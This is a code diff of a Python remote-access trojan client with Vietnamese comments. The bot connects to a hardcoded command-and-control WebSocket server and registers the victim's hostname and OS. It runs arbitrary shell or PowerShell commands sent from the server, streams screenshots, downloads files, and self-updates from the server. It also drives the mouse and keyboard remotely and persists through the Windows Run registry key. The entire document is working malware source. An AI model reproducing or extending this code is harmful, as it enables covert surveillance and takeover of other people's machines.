@@ -19,6 +19,7 @@ import pyautogui
 from PIL import Image
 import io
 import random
+import traceback
 
 # --- Cấu hình ---
 CONFIG_FILE = "config.json"
@@ -30,28 +31,30 @@ RECONNECT_DELAYS = [1, 2, 4, 8, 16, 30, 60]
 # --- Logging ---
 logging.basicConfig(
     filename=LOG_FILE,
-    level=logging.INFO,
+    level=logging.DEBUG,
     format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
 def load_config():
     if os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'r') as f:
-            return json.load(f)
+        try:
+            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except Exception as e:
+            print(f"Lỗi đọc config: {e}")
     return {
-        "server_url": "wss://your-app.onrender.com/ws",
+        "server_url": "wss://c2-server-exj9.onrender.com/ws",
         "group": "default",
         "version": "1.0.0"
     }
 
-def save_config(config):
-    with open(CONFIG_FILE, 'w') as f:
-        json.dump(config, f, indent=2)
-
 def get_bot_id():
     if os.path.exists(BOT_ID_FILE):
-        with open(BOT_ID_FILE, 'r') as f:
-            return f.read().strip()
+        try:
+            with open(BOT_ID_FILE, 'r') as f:
+                return f.read().strip()
+        except:
+            pass
     bot_id = str(uuid.uuid4())
     with open(BOT_ID_FILE, 'w') as f:
         f.write(bot_id)
@@ -63,9 +66,18 @@ GROUP = config.get("group", "default")
 VERSION = config.get("version", "1.0.0")
 SERVER_URL = config.get("server_url")
 
-# --- Các hàm thực thi lệnh ---
+print("=" * 60)
+print(f"  BOT CLIENT STARTED")
+print(f"  Bot ID: {BOT_ID}")
+print(f"  Server: {SERVER_URL}")
+print("=" * 60)
+
+# --- Hàm thực thi lệnh ---
+def exec_ping():
+    """Trả về ping latency"""
+    return f"{random.randint(5, 50)}ms"
+
 def exec_ps(command):
-    """Thực thi PowerShell (Windows) hoặc bash (Linux)"""
     try:
         if platform.system() == "Windows":
             result = subprocess.run(
@@ -77,13 +89,11 @@ def exec_ps(command):
                 ["bash", "-c", command],
                 capture_output=True, text=True, shell=False, timeout=30
             )
-        output = result.stdout + result.stderr
-        return output.strip() or "No output"
+        return (result.stdout + result.stderr).strip() or "No output"
     except Exception as e:
         return f"Error: {str(e)}"
 
 def exec_screenshot():
-    """Chụp màn hình, nén JPEG chất lượng 50% -> base64"""
     try:
         screenshot = pyautogui.screenshot()
         buffer = io.BytesIO()
@@ -91,27 +101,21 @@ def exec_screenshot():
         img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
         return f"data:image/jpeg;base64,{img_base64}"
     except Exception as e:
-        return f"Error screenshot: {str(e)}"
-
-def exec_ping():
-    """Trả về thời gian phản hồi giả lập (ms)"""
-    return f"{random.randint(10, 50)}ms"
+        return f"Error: {str(e)}"
 
 def exec_download(url, save_path):
-    """Tải file từ URL"""
     try:
         r = requests.get(url, timeout=30)
         with open(save_path, 'wb') as f:
             f.write(r.content)
-        return f"Downloaded to {save_path} ({len(r.content)} bytes)"
+        return f"Downloaded {len(r.content)} bytes to {save_path}"
     except Exception as e:
         return f"Download error: {str(e)}"
 
 def exec_update(version):
-    """Tải bản cập nhật từ server và tự khởi động lại"""
     try:
         ext = ".exe" if platform.system() == "Windows" else ".py"
-        url = f"{config['server_url'].replace('ws', 'http')}/api/download/update/{version}{ext}"
+        url = f"{SERVER_URL.replace('wss', 'https').replace('ws', 'http')}/api/download/update/{version}{ext}"
         r = requests.get(url, timeout=60)
         if r.status_code != 200:
             return f"Update failed: HTTP {r.status_code}"
@@ -128,15 +132,14 @@ def exec_update(version):
             with open(new_file, 'rb') as f:
                 new_hash = hashlib.md5(f.read()).hexdigest()
             if old_hash == new_hash:
-                return "Update: already latest version"
+                return "Already latest version"
         
         shutil.copy2(new_file, current_file)
-        
         if platform.system() == "Windows":
             os.system(f"start /B {current_file}")
         else:
             os.system(f"nohup python3 {current_file} &")
-        return f"Update to version {version} successful, restarting..."
+        return f"Updated to {version}, restarting..."
     except Exception as e:
         return f"Update error: {str(e)}"
 
@@ -149,8 +152,7 @@ def exec_cd(path):
 
 def exec_ls():
     try:
-        files = os.listdir('.')
-        return "\n".join(files)
+        return "\n".join(os.listdir('.'))
     except Exception as e:
         return f"ls error: {str(e)}"
 
@@ -167,23 +169,20 @@ def exec_kill():
 
 # --- RAT Commands ---
 def exec_rat_notepad(text):
-    """Mở Notepad và gõ text"""
     try:
         if platform.system() == "Windows":
             subprocess.Popen(["notepad.exe"])
             time.sleep(1.5)
             pyautogui.write(text)
-            return f"Notepad opened, wrote {len(text)} chars"
         else:
             subprocess.Popen(["gedit", "--new-window"])
             time.sleep(1.5)
             pyautogui.write(text)
-            return f"gedit opened, wrote {len(text)} chars"
+        return f"Notepad opened, wrote {len(text)} chars"
     except Exception as e:
         return f"Notepad error: {str(e)}"
 
 def exec_rat_browser(url):
-    """Mở trình duyệt với URL"""
     try:
         import webbrowser
         webbrowser.open(url)
@@ -192,62 +191,43 @@ def exec_rat_browser(url):
         return f"Browser error: {str(e)}"
 
 def exec_rat_event(event_type, *args):
-    """Xử lý sự kiện RAT: click, move, key"""
     try:
         pyautogui.FAILSAFE = False
         if event_type == "click":
             if len(args) >= 2:
-                x, y = int(args[0]), int(args[1])
-                pyautogui.click(x, y)
+                pyautogui.click(int(args[0]), int(args[1]))
             else:
                 pyautogui.click()
             return "Click sent"
         elif event_type == "rightclick":
             if len(args) >= 2:
-                x, y = int(args[0]), int(args[1])
-                pyautogui.rightClick(x, y)
+                pyautogui.rightClick(int(args[0]), int(args[1]))
             else:
                 pyautogui.rightClick()
             return "Right click sent"
         elif event_type == "doubleclick":
             if len(args) >= 2:
-                x, y = int(args[0]), int(args[1])
-                pyautogui.doubleClick(x, y)
+                pyautogui.doubleClick(int(args[0]), int(args[1]))
             else:
                 pyautogui.doubleClick()
             return "Double click sent"
         elif event_type == "move":
             if len(args) >= 2:
-                x, y = int(args[0]), int(args[1])
-                pyautogui.moveTo(x, y, duration=0.1)
-                return f"Moved to ({x}, {y})"
+                pyautogui.moveTo(int(args[0]), int(args[1]), duration=0.1)
+                return f"Moved to ({args[0]}, {args[1]})"
             return "Move requires x,y"
         elif event_type == "key":
-            text = args[0] if args else ""
-            pyautogui.typewrite(text)
-            return f"Typed: {text[:50]}..."
+            pyautogui.typewrite(args[0] if args else "")
+            return "Key sent"
         else:
             return f"Unknown event: {event_type}"
     except Exception as e:
         return f"Event error: {str(e)}"
 
-def exec_rat_stream():
-    """Gửi ảnh màn hình liên tục (stream)"""
-    return "Stream started"
-
-def exec_rat_start():
-    """Bắt đầu phiên RAT"""
-    return "RAT session started"
-
-def exec_rat_stop():
-    """Dừng phiên RAT"""
-    return "RAT session stopped"
-
-# Bảng ánh xạ lệnh
 COMMANDS = {
+    "ping": lambda *_: exec_ping(),
     "ps": exec_ps,
     "sc": lambda *_: exec_screenshot(),
-    "ping": lambda *_: exec_ping(),
     "download": exec_download,
     "update": exec_update,
     "cd": exec_cd,
@@ -257,20 +237,22 @@ COMMANDS = {
     "rat_notepad": exec_rat_notepad,
     "rat_browser": exec_rat_browser,
     "rat_event": exec_rat_event,
-    "rat_stream": exec_rat_stream,
-    "rat_start": exec_rat_start,
-    "rat_stop": exec_rat_stop,
+    "rat_stream": lambda *_: "Stream started",
+    "rat_start": lambda *_: "RAT started",
+    "rat_stop": lambda *_: "RAT stopped",
 }
 
-# --- Stream handler (gửi ảnh liên tục) ---
+# --- Stream screenshots ---
 async def stream_screenshots(websocket):
-    """Gửi ảnh màn hình liên tục qua WebSocket"""
+    """Gửi ảnh màn hình liên tục"""
     try:
+        print("📸 Bắt đầu stream screenshots...")
         while True:
             screenshot = pyautogui.screenshot()
             buffer = io.BytesIO()
             screenshot.save(buffer, format="JPEG", quality=30)
             img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
+            
             await websocket.send(json.dumps({
                 "type": "rat_stream",
                 "bot_id": BOT_ID,
@@ -278,18 +260,28 @@ async def stream_screenshots(websocket):
                 "timestamp": time.time()
             }))
             await asyncio.sleep(0.3)
+    except asyncio.CancelledError:
+        print("📸 Stream stopped")
+        raise
     except Exception as e:
+        print(f"❌ Stream error: {e}")
         logging.error(f"Stream error: {e}")
 
+# --- Xử lý lệnh ---
 async def handle_command(cmd_data):
     cmd_id = cmd_data.get("cmd_id")
     cmd = cmd_data.get("command")
     args = cmd_data.get("args", [])
+    
     if not cmd:
         return None
     
+    # Tách lệnh chính
     parts = cmd.split()
     main_cmd = parts[0]
+    
+    print(f"📩 Nhận lệnh: {cmd} (ID: {cmd_id})")
+    
     if main_cmd not in COMMANDS:
         return {
             "cmd_id": cmd_id,
@@ -298,6 +290,7 @@ async def handle_command(cmd_data):
         }
     
     try:
+        # Xử lý từng lệnh
         if main_cmd == "ps":
             result = exec_ps(" ".join(parts[1:]))
         elif main_cmd == "download":
@@ -322,36 +315,45 @@ async def handle_command(cmd_data):
                 result = exec_rat_notepad(" ".join(args))
             elif main_cmd == "rat_browser":
                 result = exec_rat_browser(args[0] if args else "https://www.google.com")
-            elif main_cmd == "rat_stream":
-                result = "Streaming..."
             else:
                 result = COMMANDS[main_cmd](*args)
         else:
             result = COMMANDS[main_cmd](*args)
+        
+        print(f"✅ Kết quả: {result[:100]}...")
+        return {
+            "cmd_id": cmd_id,
+            "result": result,
+            "status": "ok"
+        }
     except Exception as e:
-        result = f"Execution error: {str(e)}"
-    
-    return {
-        "cmd_id": cmd_id,
-        "result": result,
-        "status": "ok"
-    }
+        error_msg = f"Execution error: {str(e)}\n{traceback.format_exc()}"
+        logging.error(error_msg)
+        return {
+            "cmd_id": cmd_id,
+            "result": error_msg,
+            "status": "error"
+        }
 
 async def self_destruct():
     await asyncio.sleep(1)
     sys.exit(0)
 
+# --- Main loop ---
 async def bot_loop():
+    global SERVER_URL
+    
+    if not SERVER_URL:
+        SERVER_URL = "wss://c2-server-exj9.onrender.com/ws"
+    
     reconnect_delay = 0
-    try:
-        screen = pyautogui.size()
-    except:
-        screen = type('obj', (object,), {'width': 1920, 'height': 1080})()
+    screen = pyautogui.size()
     
     while True:
         try:
+            print(f"🔗 Đang kết nối tới: {SERVER_URL}")
             async with websockets.connect(SERVER_URL) as websocket:
-                logging.info(f"Connected to {SERVER_URL} as {BOT_ID}")
+                print("✅ Đã kết nối thành công!")
                 
                 # Đăng ký bot
                 await websocket.send(json.dumps({
@@ -361,17 +363,17 @@ async def bot_loop():
                     "version": VERSION,
                     "os": platform.system(),
                     "hostname": platform.node(),
-                    "screen_width": screen.width if hasattr(screen, 'width') else 1920,
-                    "screen_height": screen.height if hasattr(screen, 'height') else 1080
+                    "screen_width": screen.width,
+                    "screen_height": screen.height
                 }))
-                reconnect_delay = 0
+                print("📝 Đã gửi đăng ký bot")
                 
-                # Biến để theo dõi stream
+                reconnect_delay = 0
                 stream_task = None
                 
                 while True:
                     try:
-                        # Heartbeat
+                        # Gửi heartbeat
                         await websocket.send(json.dumps({
                             "type": "heartbeat",
                             "bot_id": BOT_ID,
@@ -397,19 +399,21 @@ async def bot_loop():
                                         "result": "Stream started",
                                         "status": "ok"
                                     }))
+                                    print("🎥 Stream đã bắt đầu")
                                 elif cmd == "rat_stop":
                                     if stream_task and not stream_task.done():
                                         stream_task.cancel()
                                         stream_task = None
-                                    result = exec_rat_stop()
+                                    result = "RAT stopped"
                                     await websocket.send(json.dumps({
                                         "type": "result",
                                         "cmd_id": payload.get("cmd_id", ""),
                                         "result": result,
                                         "status": "ok"
                                     }))
+                                    print("⏹️ Stream đã dừng")
                                 else:
-                                    # Lệnh thông thường
+                                    # Xử lý lệnh thông thường
                                     result = await handle_command(payload)
                                     if result:
                                         await websocket.send(json.dumps({
@@ -418,29 +422,42 @@ async def bot_loop():
                                             "result": result["result"],
                                             "status": result["status"]
                                         }))
+                                        print(f"📤 Đã gửi kết quả cho lệnh {result['cmd_id']}")
                                         
                         except asyncio.TimeoutError:
+                            # Timeout thì tiếp tục heartbeat
                             pass
                         except websockets.exceptions.ConnectionClosed:
-                            logging.warning("Connection closed, reconnecting...")
+                            print("⚠️ Mất kết nối WebSocket")
                             break
+                        except json.JSONDecodeError as e:
+                            print(f"⚠️ Lỗi parse JSON: {e}")
+                            continue
                         except Exception as e:
+                            print(f"❌ Lỗi nhận dữ liệu: {e}")
                             logging.error(f"Recv error: {e}")
                             break
                             
-                # Cleanup stream task when disconnected
+                    except Exception as e:
+                        print(f"❌ Lỗi heartbeat: {e}")
+                        logging.error(f"Heartbeat error: {e}")
+                        break
+                
+                # Cleanup
                 if stream_task and not stream_task.done():
                     stream_task.cancel()
                     stream_task = None
-                
+                    
         except Exception as e:
+            print(f"❌ Lỗi kết nối: {e}")
             logging.error(f"Connection error: {e}")
+            
             if reconnect_delay < len(RECONNECT_DELAYS):
                 delay = RECONNECT_DELAYS[reconnect_delay]
             else:
                 delay = 60
             reconnect_delay += 1
-            logging.info(f"Reconnecting in {delay}s...")
+            print(f"⏳ Thử lại sau {delay}s...")
             await asyncio.sleep(delay)
 
 # --- Persistence ---
@@ -455,33 +472,17 @@ def setup_persistence():
             )
             winreg.SetValueEx(key, "BotClient", 0, winreg.REG_SZ, f'"{sys.executable}" "{sys.argv[0]}"')
             winreg.CloseKey(key)
-            logging.info("Persistence added to Windows Registry")
-        else:
-            script_path = os.path.abspath(sys.argv[0])
-            cron_line = f"@reboot python3 {script_path} > /dev/null 2>&1 &\n"
-            try:
-                with open("/etc/crontab", "a") as f:
-                    f.write(cron_line)
-                logging.info("Persistence added to crontab")
-            except PermissionError:
-                try:
-                    with open(os.path.expanduser("~/.bashrc"), "a") as f:
-                        f.write(f"\npython3 {script_path} &\n")
-                    logging.info("Persistence added to .bashrc")
-                except:
-                    logging.warning("Could not add persistence")
+            print("✅ Đã thêm vào Registry")
     except Exception as e:
-        logging.error(f"Persistence setup error: {e}")
+        print(f"⚠️ Không thêm được persistence: {e}")
 
-# --- Daemon hóa ---
 def daemonize():
     if platform.system() != "Windows":
         try:
             if os.fork() > 0:
                 sys.exit(0)
-        except OSError as e:
-            logging.error(f"Fork failed: {e}")
-            sys.exit(1)
+        except:
+            pass
         os.setsid()
         os.chdir("/")
         sys.stdout.close()
@@ -490,24 +491,20 @@ def daemonize():
 # --- Main ---
 if __name__ == "__main__":
     try:
-        # Kiểm tra phiên bản Python
         if sys.version_info < (3, 8):
-            print("Requires Python 3.8+")
+            print("Cần Python 3.8+")
             sys.exit(1)
         
-        # Daemon hóa (không dùng cho Windows)
         if platform.system() != "Windows":
             daemonize()
         
         setup_persistence()
-        logging.info(f"Bot {BOT_ID} started (version {VERSION})")
+        print("🚀 Bot đang chạy...")
         
-        try:
-            asyncio.run(bot_loop())
-        except KeyboardInterrupt:
-            logging.info("Bot stopped by user")
-        except Exception as e:
-            logging.error(f"Loop error: {e}")
+        asyncio.run(bot_loop())
+        
+    except KeyboardInterrupt:
+        print("\n🛑 Bot đã dừng")
     except Exception as e:
+        print(f"❌ Lỗi: {e}")
         logging.error(f"Fatal error: {e}")
-        print(f"Fatal error: {e}")
